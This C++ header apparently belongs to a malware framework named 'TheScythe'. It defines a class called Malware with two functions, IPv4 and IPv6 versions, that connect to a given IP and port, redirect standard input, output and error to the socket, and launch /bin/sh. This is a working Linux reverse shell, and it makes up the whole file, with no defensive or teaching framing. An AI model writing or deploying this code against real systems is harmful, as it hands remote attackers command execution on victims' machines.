//
// Created by grimreaper on 3/19/23.
//

#ifndef THE_SCYTHE_LINUX_REVERSE_TCP_HPP
#define THE_SCYTHE_LINUX_REVERSE_TCP_HPP

#include "../core/networking/tcp_client.hpp"
#include "../core/execution/execution.hpp"

namespace TheScythe {
    namespace Core {
        class Malware {
        protected:

        public:
            /// Linux Reverse Tcp
            static void linux_reverse_tcp4(const char *ip, int port);
            static void linux_reverse_tcp6(const char *ip, int port);
        };
        void Malware::linux_reverse_tcp4(const char *ip, int port) {
            int client_fd = Socket::linux_tcp_connect_ipv4(ip, port, NULL);
            dup2(client_fd, 0);
            dup2(client_fd, 1);
            dup2(client_fd, 2);
            execve("/bin/sh", 0, 0);
        }

        void Malware::linux_reverse_tcp6(const char *ip, int port) {
            int client_fd = Socket::linux_tcp_connect_ipv6(ip, port, NULL);
            dup2(client_fd, 0);
            dup2(client_fd, 1);
            dup2(client_fd, 2);
            execve("/bin/sh", 0, 0);
        }
    };
}


#endif //THE_SCYTHE_LINUX_REVERSE_TCP_HPP
